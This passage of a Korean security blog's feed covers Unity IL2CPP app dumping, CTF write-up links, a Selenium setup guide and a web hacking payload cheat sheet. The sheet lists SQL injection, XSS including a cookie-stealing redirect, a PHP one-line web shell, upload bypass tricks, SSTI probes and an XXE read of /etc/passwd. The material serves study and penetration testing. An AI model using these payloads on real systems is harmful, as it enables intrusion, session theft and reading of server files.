      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.</p><h3 id="Unity란"><a href="#Unity란" class="headerlink" title="Unity란?"></a>Unity란?</h3><p>Unity는 게임 개발을 위한 엔진이며 2D 및 3D 게임을 만들 수 있고,</p><p>3D Animation(3D 애니메이션), VR(가상 현실), AR(증강 현실) 콘텐츠을 제작하는 용도로 사용됩니다.</p><ul><li><a href="https://unity.com/kr">https://unity.com/kr</a></li></ul><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>Unity 엔진에는 크게 두 가지 컴파일 방식이 존재합니다.</p><ol><li>MONO Compile</li></ol><p>MONO 컴파일러의 경우 안드로이드의 JIT 컴파일 방식이라고 생각하시면 됩니다.</p><p>JIT 컴파일러는 IL(중간언어)로 작성된 DLL 파일을 읽어, Runtime으로 코드 실행을 합니다.</p><p>빠른 빌드속도와 .NET 프레임워크를 사용하기 때문에 크로스 플랫폼(Window, Linux, MacOS)에서 구동이 가능하지만, 보안에는 매우 취약합니다.</p><p>아래 MONO 컴파일러의 빌드 방식을 확인해봅시다.</p><p><img src="/img/post/unity/mono.png" class="lazyload" data-srcset="/img/post/unity/mono.png" srcset="data:image/png;base64,666" alt="photo1"></p><p>이렇게 일반적으로 컴파일 된 MONO 기반의 게임은 앱을 빌드하는 과정에서 만들어지는 <code> DLL </code> 파일을 통해서</p><p>쉽게 디컴파일이 가능하고 원본에 가까운 소스코드를 확인할 수 있게 됩니다.</p><ol start="2"><li>IL2CPP Compile</li></ol><p>IL2CPP 방식으로 컴파일 된 경우에는 약간 다른 구조를 띄고 있습니다.</p><p>아래 사진을 보면서 함께 설명을 하도록 하겠습니다.</p><p><img src="/img/post/unity/unitycompiler.png" class="lazyload" data-srcset="/img/post/unity/unitycompiler.png" srcset="data:image/png;base64,666" alt="photo2"></p><p>이렇게 보면 위에서 본 사진이랑 확연히 구분하실 수 있을겁니다.</p><p>사진의 컴파일 과정을 보면, IL2CPP 방식에는 IL Assembly 코드를 <code> il2cpp.exe </code> 에 의해서</p><p>C++ 소스코드로 변환하게 되고 이를 C++ 컴파일러에 전달하여 Native Library를 생성하는 구조입니다.</p><p>즉 JAVA에서 AOT 컴파일 방식을 의미하고 있는 것이죠.</p><p>이러한 과정으로 빌드된 APK를 내부를 분석하면 <code>lib->&#123;device-architecture&#125;</code> 경로에</p><p>3개의 Native Library가 존재함을 알 수 있습니다.</p><p><img src="/img/post/unity/nativelib.png" class="lazyload" data-srcset="/img/post/unity/nativelib.png" srcset="data:image/png;base64,666" alt="photo3"></p><p>이 라이브러리는 우선 앱이 실행될 때 <code> libunity.so </code> 를 로드하여 초기 설정값들을 얻어오고,</p><p>마지막에 <code> libil2cpp.so </code> 파일을 로드하여 앱에 정의된 메소드들을 사용하게 됩니다.</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>전반적인 과정을 살펴봤으니, 실제 Unity로 개발 된 앱을 가지고 분석을 해보겠습니다.</p><p>앱에 대한 정보는 문제의 여지가 있어 공개되지 않습니다 (^_^)</p><ol><li>어플리케이션 압축 해제 후 내부 구성 파일 확인</li></ol><p><img src="/img/post/unity/app1.png" class="lazyload" data-srcset="/img/post/unity/app1.png" srcset="data:image/png;base64,666" alt="photo4"></p><ol start="2"><li>native library 확인 (unity)</li></ol><p><img src="/img/post/unity/app2.png" class="lazyload" data-srcset="/img/post/unity/app2.png" srcset="data:image/png;base64,666" alt="photo5"></p><ol start="3"><li>IL2CPPDUMPER 도구를 활용하여 앱 내부 파일 덤프</li></ol><p><img src="/img/post/unity/app3.png" class="lazyload" data-srcset="/img/post/unity/app3.png" srcset="data:image/png;base64,666" alt="photo6"></p><ol start="4"><li>Assembly-CSharp.dll 로드</li></ol><p><img src="/img/post/unity/app4.png" class="lazyload" data-srcset="/img/post/unity/app4.png" srcset="data:image/png;base64,666" alt="photo7"></p><p>실제 게임 구동을 위해 구현된 Method들을 확인할 수 있습니다.</p><ol start="5"><li>특정 메소드 RVA, Offset 확인</li></ol><p><img src="/img/post/unity/app5.png" class="lazyload" data-srcset="/img/post/unity/app5.png" srcset="data:image/png;base64,666" alt="photo8"></p><p>주어진 RVA, Offset 값을 통해, 모듈 Base 주소를 구해서 Offset 연산을 해주면,</p><p>해당 함수의 주소를 찾을 수 있어, 실제 게임 내 값을 변조하거나 하는 등의 방법도 가능하게 됩니다.</p><p>이렇게 단계별로 나눠 분석 도구를 활용해 간단하게만 분석을 해봤는데,</p><p>이후 실제 앱을 기반으로 게임 내 값을 변조한다거나 하는 방법은 정리 및 검토가 끝난 후 추가로 포스팅 하겠습니다<del>_</del></p><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul><li><p><a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a> (ILSPY)</p></li><li><p><a href="https://github.com/0xd4d/dnSpy">https://github.com/0xd4d/dnSpy</a> (dnSpy)</p></li><li><p><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a> (IL2CppDumper)</p></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li>LINFORUM (<a href="http://linforum.kr/">http://linforum.kr/</a>)</li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Unity/">Unity</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile-Hacking/">Mobile Hacking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Unity 엔진으로 개발 된 앱 덤프 도구</title>
      <link>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</link>
      <guid>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</guid>
      <pubDate>Sat, 24 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;il2cppDumper&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Per</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><ul><li>il2cppDumper<ul><li><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a></li></ul></li></ul><pre><code>il2cppdumper.exe &lt;executable-file&gt; &lt;metadata.dat&gt; &lt;output-dir&gt;</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
      
      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
      
      <category domain="https://blog.jhyeon.dev/tags/il2cppdumper/">il2cppdumper</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Web/Hacking Payload Docx</title>
      <link>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</link>
      <guid>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/</guid>
      <pubDate>Tue, 20 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.&lt;/p&gt;
&lt;p&gt;자료는</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>해당 자료는 웹 해킹에 종류별 페이로드 문서를 정리하는 목적으로 작성된 게시글입니다.</p><p>자료는 계속해서 업데이트가 되는 자료이며, 최신순을 기준으로 상단에 기록됩니다.</p><p>페이로드는 보안상 문제로 일부 변환되어 표시되며 다음 사이트에서 복호화가 가능합니다.</p><ul><li><a href="http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/">http://parkjuwan.dothome.co.kr/webapp/ltgt_conv/</a></li></ul><h3 id="SQL-Injection-Basic"><a href="#SQL-Injection-Basic" class="headerlink" title="SQL Injection(Basic)"></a>SQL Injection(Basic)</h3><pre><code>&#39; or &#39;1&#39; = &#39;1&#39; or 1=1#&#39; or 1=1--or 1=1or true--or 1=1/*1′) and &#39;1′=&#39;1–admin&#39; --&#39; order by 2#&#39; union select 1,2,3,version()#&#39; union select 1,2,3,table_name from information.schema.tables#&#39; union select 1,2,3,table_name from information.schema.tables where table_name=&#39;tb_name&#39;#select count(*) from information_schema.tables where tables_schema=database();select length(table_name) from information_schema.tables where tables_schema=database() limit 0,1;select length(column_name) from table_name;select ascii(substring(table_name, 1, 1)) from informatio.schema.tables where table_schema=database(), limit 0, 1;</code></pre><h3 id="SQL-Injection-NoSQL"><a href="#SQL-Injection-NoSQL" class="headerlink" title="SQL Injection(NoSQL)"></a>SQL Injection(NoSQL)</h3><pre><code class="sql">param1[$ne]=1234&amp;param2[$ne]=0000</code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre><code class="html">&lt;!-- basic --&gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;&amp;lt;img src=javascript:alert(1)&amp;gt;&amp;lt;img src=&quot;javascript:alert(1)&quot;&amp;gt;&amp;lt;img src=javascript:alert(String.FromCharCode(88,83,83))&amp;gt;&amp;lt;img src=x onmouseover=&quot;alert(1)&quot;&amp;gt;&amp;lt;img src=&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#39;&amp;amp;#88;&amp;amp;#83;&amp;amp;#83;&amp;amp;#39;&amp;amp;#41;&amp;gt;&amp;lt;svg onload=alert(1)&amp;gt;&amp;lt;body onload=alert(1)&amp;gt;&lt;!-- HTML CHAR --&gt;&amp;#x3c;script&amp;#x3e;alert(1)&amp;#x3c;/script&amp;#x3e;&lt;!-- UNICODE Encoding --&gt;%u003cscript%u003ealert(1)%u003c/script%u003e&lt;!-- redirect --&gt;&amp;lt;script&amp;gt;location.href=&#39;url&#39;;&amp;lt;/script&amp;gt;&amp;lt;img src=x onerror=&quot;this.src=&#39;url&#39;&quot;;/&amp;gt;&amp;lt;iframe src=&quot;data/html, urlencode_text&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;!-- session hijacking --&gt;&amp;lt;script&amp;gt;location.href=&#39;url/&#39;+document.cookie;&amp;lt;/script&amp;gt;</code></pre><h3 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h3><pre><code class="php">&lt;?phpsystem($_GET[&#39;cmd&#39;]);?&gt;</code></pre><h3 id="WebShell-Bypass-Trick"><a href="#WebShell-Bypass-Trick" class="headerlink" title="WebShell(Bypass Trick)"></a>WebShell(Bypass Trick)</h3><ul><li><p>filename extension (php.jpg , php.png …)</p></li><li><p>gif89a, jpg, png (Insert to Image File Header)</p></li></ul><h3 id="PHP-Wrapper-Injection"><a href="#PHP-Wrapper-Injection" class="headerlink" title="PHP Wrapper Injection"></a>PHP Wrapper Injection</h3><pre><code>expect://lsphp://filter/convert.base64-encode/resource=filename</code></pre><h3 id="SSTI-Python"><a href="#SSTI-Python" class="headerlink" title="SSTI(Python)"></a>SSTI(Python)</h3><pre><code>&#123;&#123;7*7&#125;&#125;&#123;&#123;config.items()&#125;&#125;&#123;&#123; [].class.base.subclasses() &#125;&#125;&#123;&#123;''.class.mro()[1].subclasses()&#125;&#125;&#123;&#123; ''.__class__.__mro__[2].__subclasses__() &#125;&#125;</code></pre><h3 id="SSTI-Bypass-Trick"><a href="#SSTI-Bypass-Trick" class="headerlink" title="SSTI(Bypass Trick)"></a>SSTI(Bypass Trick)</h3><p><img src="/img/post/webpayload/filters.png" class="lazyload" data-srcset="/img/post/webpayload/filters.png" srcset="data:image/png;base64,666" alt="photo1"></p><ul><li>ascii encode(<a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a>)</li></ul><h3 id="XML-Injection"><a href="#XML-Injection" class="headerlink" title="XML Injection"></a>XML Injection</h3><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE cmd [                                     &lt;!ENTITY passwd SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;                                                 &lt;cmd&gt;&amp;passwd;&lt;/cmd&gt;</code></pre><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a></li><li><a href="https://github.com/payloadbox/ssti-payloads">https://github.com/payloadbox/ssti-payloads</a></li><li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f</a></li><li><a href="https://github.com/omurugur/SQL_Injection_Payload/">https://github.com/omurugur/SQL_Injection_Payload/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
      
      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
      
      <category domain="https://blog.jhyeon.dev/tags/webhacking-kr/">webhacking.kr</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/21/webpayload-210421/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>HackPackCTF 2021 Writeup</title>
      <link>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</link>
      <guid>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/</guid>
      <pubDate>Sat, 17 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)&lt;/p</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>HACKPACK CTF 2021 (4/17 Sat 01:00 ~ 4/18 Mon 01:00 KST)</p><ul><li><a href="https://ctf2021.hackpack.club/team">https://ctf2021.hackpack.club/team</a></li><li>pwnhub (jhyeon, owl, 3kk, MalHyuk)</li><li>rank : 81th (400pt)</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다.</p><ul><li><a href="https://public.jhyeon.dev/ctf/hackpack2021">https://public.jhyeon.dev/ctf/hackpack2021</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwn/">Pwn</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Rev/">Rev</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/HackPackCTF-2021/">HackPackCTF 2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/18/hackpackctf-210418/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RITSEC-CTF 2021 Writeup</title>
      <link>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/</link>
      <guid>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/</guid>
      <pubDate>Sun, 11 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;TEAM_NAME : &lt;code&gt; pwnhub (rank 107th, 2560pt) &lt;/code&gt;&lt;/p&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>TEAM_NAME : <code> pwnhub (rank 107th, 2560pt) </code></p><p>풀이 게시글은 아래 노션에서 확인하실 수 있습니다.</p><p><a href="https://public.jhyeon.dev/ctf/ritsec2021">https://public.jhyeon.dev/ctf/ritsec2021</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/RITSEC-2021/">RITSEC 2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VirtualBox Escape Research(CVE 2019-2525 &amp; 2548)</title>
      <link>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</link>
      <guid>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</guid>
      <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;img src=&quot;/img/post/demon/virtualbox/team.png&quot; class=&quot;lazyloa</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><img src="/img/post/demon/virtualbox/team.png" class="lazyload" data-srcset="/img/post/demon/virtualbox/team.png" srcset="data:image/png;base64,666"><p>이번에 소속으로 활동 중인 데몬팀(DEMON TEAM) 팀 세미나 진행을 위해 “VirtualBox Research Study Team” 에서</p><p>VirtualBox Escape (CVE 2019-2525 &amp; 2548) 에 대해 연구했던 자료를 공유합니다.</p><p>발표 자료는 비공개지만, 개인 노션에 정리한 자료는 다음 링크에서 확인할 수 있습니다.</p><p><a href="https://public.jhyeon.dev/research/virtualbox">https://public.jhyeon.dev/research/virtualbox</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VirtualBox/">VirtualBox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVE/">CVE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVSS/">CVSS</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AngStormCTF 2021 Write-Up</title>
      <link>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</link>
      <guid>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</guid>
      <pubDate>Fri, 09 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.&lt;/p&gt;
&lt;p&gt;TEAM_NAME : &lt;cod</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.</p><p>TEAM_NAME : <code> pwnhub (rank 195th, 1200pt) </code></p><p>풀이 게시글은 아래 노션에서 확인하실 수 있습니다.</p><p><a href="https://public.jhyeon.dev/ctf/angstorm2021">https://public.jhyeon.dev/ctf/angstorm2021</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crpyto/">Crpyto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AngStormCTF-2021/">AngStormCTF 2021</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UMassCTF&#39;21 Write Up</title>
      <link>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</link>
      <guid>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</guid>
      <pubDate>Sun, 28 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Post&quot;&gt;&lt;a href=&quot;#Post&quot; class=&quot;headerlink&quot; title=&quot;Post&quot;&gt;&lt;/a&gt;Post&lt;/h3&gt;&lt;p&gt;해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h3><p>해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.</p><p><a href="https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5">https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
      
      <category domain="https://blog.jhyeon.dev/tags/UMassCTF-21/">UMassCTF&#39;21</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWS EC2 환경에서 Selenium(ChromeDriver) 활용하기</title>
      <link>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</link>
      <guid>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</guid>
      <pubDate>Wed, 24 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정리해놓고 나중에 써먹고자</p><p>아래의 글을 정리한다.</p><h3 id="Install-Package"><a href="#Install-Package" class="headerlink" title="Install Package"></a>Install Package</h3><p>우선 chromedriver를 사용하기 전 크롬과 관련된 패키지를 설치 해줘야 한다.</p><pre><code class="bash">sudo apt updatesudo apt install wget unzipecho &quot;deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main&quot; &gt;&gt; /etc/apt/sources.listwget https://dl.google.com/linux/linux_signing_key.pubsudo apt install gnupgsudo apt-key add linux_signing_key.pubsudo apt install google-chrome-stable</code></pre><p>여기까지가 관련 패키지들을 설치해주는 명령어이다. 그 다음은 selenium 설치 과정이다.</p><p>pip로 selenium을 설치해주면 끝나서 간편하다.</p><pre><code class="bash">pip3 install --user selenium</code></pre><p>이렇게만 설치한다고 끝이 아닌, 크롬 공식 홈페이지에서 driver를 다운 받아줘야 한다.</p><p><a href="http://chromedriver.chromium.org/downloads">http://chromedriver.chromium.org/downloads</a></p><p>위 사이트에서 크롬 브라우저의 버전을 선택하여 wget으로 내려 받은 뒤 실행 파일을 사용하면 된다.</p><pre><code class="bash">wget https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zipunzip chromedriver_linux64.zip</code></pre><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>이렇게 설치했으면 크롬 브라우저를 어떻게 활용하냐, python 기준으로 예제 코드는 다음과 같다.</p><p>사실, 크롬 브라우저가 메모리를 되게 먹기 때문에 multiprocessing 처리를 하는 방식 등으로 사용하면 좋을 듯 하다.</p><p>메모리를 좀 줄여보겠다고 gpu, headless 등 각종 옵션을 넣긴 했지만 자체적으로 메모리를 많이 써서 큰 도움은 안되는 듯 하다.</p><pre><code class="py">#!/usr/bin/python3from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsdef openbr():    url = &quot;&quot;    options = webdriver.ChromeOptions()    options.add_argument(&#39;--headless&#39;)    options.add_argument(&#39;--no-sandbox&#39;)    options.add_argument(&#39;--disable-dev-shm-usage&#39;)    options.add_argument(&quot;--disable-gpu&quot;)    options.add_argument(&quot;--disable-infobars&quot;)    browser = webdriver.Chrome(chrome_options=options, executable_path=&quot;./chromedriver&quot;)    browser.get(url)    html = browser.page_source    return htmlif __name__ == &quot;__main__&quot;:    try:        openbr()    except Exception as excepterr:        logging~~</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/AWS/">AWS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/EC2/">EC2</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu-CLI/">Ubuntu CLI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Selenium/">Selenium</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ChromeDriver/">ChromeDriver</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Node.JS VM Module Sandbox Escape Research</title>
      <link>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</link>
      <guid>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</guid>
      <pubDate>Sun, 07 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-Node-JS&quot;&gt;&lt;a href=&quot;#1-Node-JS&quot; class=&quot;headerlink&quot; title=&quot;[1] Node.JS&quot;&gt;&lt;/a&gt;[1] Node.JS&lt;/h3&gt;&lt;p&gt;Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 </description>
        
      
      
      
